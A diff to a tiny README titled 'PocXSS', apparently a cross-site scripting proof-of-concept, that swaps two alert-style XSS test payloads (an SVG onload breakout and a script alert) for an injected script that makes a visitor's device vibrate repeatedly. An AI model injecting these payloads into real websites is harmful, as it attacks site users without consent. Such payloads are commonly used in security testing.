@@ -1,5 +1,7 @@
 # PocXSS
-'">&lt;svg/onload=alert(document.domain)>
 ```
-<script>alert('XSS')</script>
+<script type="text/javascript">
+    navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+    navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500]);
+</script>
 ```
